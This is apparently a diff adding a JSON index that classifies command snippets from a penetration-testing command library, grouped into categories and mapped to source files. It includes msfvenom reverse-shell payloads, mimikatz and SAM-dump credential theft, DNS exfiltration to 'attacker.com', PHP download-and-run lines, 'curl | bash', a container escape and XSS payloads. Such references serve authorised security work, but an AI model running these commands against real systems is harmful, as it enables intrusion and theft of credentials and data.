+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "python scripts: gpp-decrypt.py",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "$env:USERDNSDOMAIN | ForEach-Object { 'DC=' + ($_ -replace '\\.',',DC=') }",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "hashcat -m 22921 (aes-256-cbc only, NOT aes-256-ctr)",
+        "file": "data/commands/enumeration/password-attacks-john.json"
+      },
+      {
+        "text": "Manual: for pw in $(cat wordlist); do echo -n \"$pw\" | md5sum; done",
+        "file": "data/commands/enumeration/password-attacks-hashcat.json"
+      },
+      {
+        "text": "mysql -h <TARGET> -u <USER> -p (interactive password prompt)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "postgres-direct-connect (with password inline)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "Download from: https://live.sysinternals.com/PsExec64.exe",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "smbmap -u <USER> -p <PASS> -H <TARGET>",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "grep -r '<QUERY>' /usr/share/metasploit-framework/modules/exploits/",
+        "file": "data/commands/exploitation/metasploit-core.json"
+      },
+      {
+        "text": "nmap <OPTIONS> <TARGET> -oX scan.xml && msf-db-import scan.xml",
+        "file": "data/commands/exploitation/metasploit-core.json"
+      },
+      {
+        "text": "msfvenom -p linux/x86/shell_reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter/reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "msfvenom -p windows/shell_reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "google: site:exploit-db.com <SERVICE>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Update ExploitDB: searchsploit -u",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Find exploit first: searchsploit <SERVICE> <VERSION>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Get script help: nmap --script-help <SCRIPT_NAME>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Identify web technology: whatweb http://<TARGET>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Run gobuster first: gobuster-dir-common (complement findings)",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "nc -nvlp <LPORT> (for non-staged shells only)",
+        "file": "data/commands/exploitation/metasploit-handlers.json"
+      },
+      {
+        "text": "WinRM enabled on target (port 5985/5986)",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "pth-impacket-psexec per target",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Use -X for PowerShell commands",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "rlwrap nc -lvnp <LPORT> for readline support (arrow keys, history)",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "msfconsole exploit/multi/handler for Meterpreter shells",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "psexec-impacket-shell for direct SYSTEM shell",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "Base64 payload generated with revshell-ps-generator",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "dcom-shellwindows (similar technique)",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "ls /usr/share/metasploit-framework/modules/auxiliary/scanner/<SERVICE>/",
+        "file": "data/commands/exploitation/metasploit-auxiliary.json"
+      },
+      {
+        "text": "psexec-impacket-shell with -hashes",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "msfvenom -p windows/x64/meterpreter_reverse_tcp (Meterpreter instead)",
+        "file": "data/commands/exploitation/metasploit-payloads.json"
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter_reverse_tcp (Meterpreter variant)",
+        "file": "data/commands/exploitation/metasploit-payloads.json"
+      },
+      {
+        "text": "msfvenom -p java/jsp_shell_reverse_tcp -f war (WAR file for manager deployment)",
+        "file": "data/commands/exploitation/metasploit-payloads.json"
+      },
+      {
+        "text": "overpass-mimikatz-pth already executed",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Invoke-Mimikatz for remote export",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus ptt /ticket:<FILE>",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "service ssh start - SysVinit alternative (older systems)",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "updog - HTTP server with upload support (pip install updog)",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "smb-server - SMB file sharing alternative",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "nmap localhost - External port scan verification",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "netstat -rn - Netstat routing table view",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "curl http://<TARGET>:<PORT> - HTTP service verification",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "Port forward if internal network: ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "crackmapexec smb - Modern SMB enumeration and exploitation framework",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "wmic os get caption,version - Specific OS version",
+        "file": "data/commands/pivoting/windows-utilities.json"
+      },
+      {
+        "text": "whoami /all - Complete user info",
+        "file": "data/commands/pivoting/windows-utilities.json"
+      },
+      {
+        "text": "socat-port-forward - Simple relay without SSH encryption, no authentication required",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "plink-remote-forward + microsocks - Workaround for OpenSSH <7.6",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "Pivot host can route to destination: ip route, ping <DEST_IP>",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "chisel - HTTP tunneling if SSH blocked",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "socat-port-forward - Simple relay without authentication",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Firewall allows outbound SSH from Windows: Test-NetConnection <SSH_HOST> -Port 22",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "plink-remote-forward - Windows SSH client alternative",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Proxychains configured: /etc/proxychains4.conf has correct SOCKS proxy",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "socat-port-forward - Set up relay on pivot host",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "CREATE_TIER1": [
+      {
+        "text": "Import SharpHound data",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Get-CimInstance win32_process",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "Get-ComputerInfo (PowerShell)",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ADUser $env:USERNAME",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ScheduledTask | Select TaskName,Principal",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView: . .\\PowerView.ps1",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-ADUser -Filter *",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Get-GPPPassword (PowerSploit)",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-NetUser -AdminCount",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-Acl",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      }
+    ]
+  },
+  "by_category": {
+    "unknown": [
+      {
+        "text": "nessus scan",
+        "file": "data/commands/recon.json"
+      },
+      {
+        "text": "burp intruder",
+        "file": "data/commands/web/general.json"
+      },
+      {
+        "text": "burp intruder",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "HTTP server on attacker",
+        "file": "data/commands/generated/file-transfer-additions.json"
+      },
+      {
+        "text": "Transfer LinEnum.sh",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer script",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "chmod +x",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer PowerUp.ps1",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer PrivescCheck.ps1",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Transfer Seatbelt.exe",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "grep time range in syslog files (manual)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl | grep sudo.*COMMAND",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl | grep 'Failed password'",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "w (includes user info)",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "docker info",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker version",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker pull ubuntu (larger but more tools)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker pull busybox (even smaller than alpine)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "python3 smbserver.py share .",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "samba service",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "bitsadmin for newer Windows",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "certutil base64 encoding",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "dig $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "host $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "ping $data.attacker.com",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "bitsadmin download",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "rsync for larger transfers",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "SFTP for interactive transfer",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "socat for bidirectional transfer",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use existing file upload functionality",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Python Flask upload server",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "TFTP for simpler transfers",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "SFTP for encrypted transfers",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "certutil for simpler syntax",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use individual PowerUp functions",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "mimikatz: vault::list",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "rundll32 keymgr.dll,KRShowKeyMgr",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Copy from Volume Shadow Copies",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Use mimikatz lsadump::sam",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "wmic os get Caption,Version,BuildNumber",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "dir C:\\Windows\\System32\\Tasks",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "reg save HKLM\\SAM sam.save",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "reg save HKLM\\SYSTEM system.save",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "mimikatz dpapi::masterkey",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Rubeus.exe kerberoast",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "icacls C:\\Progra~1\\*",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Transfer linpeas.sh via file transfer methods",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use LinEnum if LinPEAS fails",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use curl instead of wget",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Upload via Python HTTP server",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use LinPEAS for more comprehensive scan",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use pspy to monitor processes",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use LinPEAS which includes capability check",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use metasploit NFS scanner",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use linpeas.sh capabilities module for automated classification",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Man pages: man 7 capabilities (understand what capability enables)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Binary name extracted from getcap output",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "GTFOBins technique researched and understood",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Search SYSVOL for GPP passwords",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Search patterns: *sql*, *backup*, *service*, *admin*",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "PsLoggedOn.exe downloaded from Sysinternals Suite",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "SMB port 445 open",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "Identify target service and port",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Identify required arguments from help",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Note web server type from nmap: Apache, IIS, nginx",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Mimikatz on compromised Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "SMB port 445 open",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Metasploit web_delivery module",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "Target identified",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "DCOM enabled (default)",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "getwd (alias)",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json"
+      },
+      {
+        "text": "dir (alias)",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json"
+      },
+      {
+        "text": "download + local cat",
+        "file": "data/commands/exploitation/metasploit-meterpreter.json"
+      },
+      {
+        "text": "WinRM enabled on target (default Windows Server 2012+)",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "WinRM enabled on target (port 5985 or 5986 open)",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "RPC port 135 open on target",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json"
+      },
+      {
+        "text": "SMB connection to target (port 445)",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json"
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Use hostname in UNC path: \\\\files04\\share",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz: sekurlsa::tickets",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus: klist",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz on Windows host",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": ".kirbi ticket file",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "NTLM hash",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz: kerberos::purge",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Proxychains configured with correct SOCKS proxy",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "payload_html": [
+      {
+        "text": "<svg onload=alert(1)>",
+        "file": "data/commands/web/general.json"
+      },
+      {
+        "text": "<body onload=alert(1)>",
+        "file": "data/commands/web/general.json"
+      }
+    ],
+    "code_snippet": [
+      {
+        "text": "python requests.post()",
+        "file": "data/commands/web/general.json"
+      }
+    ],
+    "command_full": [
+      {
+        "text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "wpscan-enumerate-all (to discover usernames)",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "burp suite XML-RPC plugin",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "curl -s <URL>/feed/ | grep generator",
+        "file": "data/commands/web/wordpress.json"
+      },
+      {
+        "text": "Transfer pspy64/pspy32",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "cat /proc/*/cmdline | tr '\\0' ' '",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "ps aux | grep <PATTERN>",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "ps aux | grep <PROCESS_NAME> | awk '{print $2}'",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "cat /proc/<PID>/cmdline | tr '\\0' ' '",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "cat /var/spool/cron/crontabs/<USERNAME>",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "less /etc/crontab",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "find /etc/cron* -type f",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "at (command-line AT utility)",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "ls -la /var/spool/at/",
+        "file": "data/commands/monitoring/scheduled-tasks.json"
+      },
+      {
+        "text": "tail-follow-log /var/log/syslog",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -k (kernel messages via journald)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -kf (kernel messages via journald)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "journalctl -u ssh | grep -i failed",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "dmesg-kernel-messages (kernel only)",
+        "file": "data/commands/monitoring/log-monitoring.json"
+      },
+      {
+        "text": "ls /etc/init.d/",
+        "file": "data/commands/monitoring/service-enumeration.json"
+      },
+      {
+        "text": "top -bn1 -o %MEM | head -20",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "top -bn1 -o %CPU | head -20",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "cat /proc/meminfo",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "top -bn1",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "sar -u 1 5",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "cat /proc/loadavg",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "ls -l /proc/*/fd/ (manual check)",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "lsof +d <DIRECTORY> (non-recursive, faster)",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "cat /var/log/wtmp | utmpdump",
+        "file": "data/commands/monitoring/resource-monitoring.json"
+      },
+      {
+        "text": "# Install ClamAV on Windows test system:\n# Download from: https://www.clamav.net/downloads",
+        "file": "data/commands/av-evasion/signature-evasion.json"
+      },
+      {
+        "text": "cat /etc/group | grep docker",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "stat /var/run/docker.sock",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "cat /mnt/etc/passwd",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker-mount-escape (preferred method)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "docker-mount-escape (simpler)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "curl -T <FILE> ftp://<LHOST>/",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "python -m SimpleHTTPServer",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>",
+        "file": "data/commands/post-exploit/general-transfer.json"
+      },
+      {
+        "text": "python -m SimpleHTTPServer 8000 (Python 2)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use /dev/tcp for raw download",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "curl <URL> | bash (pipe to shell)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use -k for self-signed certificates",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "wget <URL> -O <FILE> (PowerShell alias)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "curl <URL> -o <FILE> (PowerShell alias)",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use with -i for SSH key: scp -i key.pem file target:/path",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Run directly: \\\\\\\\<LHOST>\\\\share\\\\file.exe",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "socat TCP-LISTEN:port,reuseaddr,fork file:output",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use base64 encoding for text-safe transfer",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
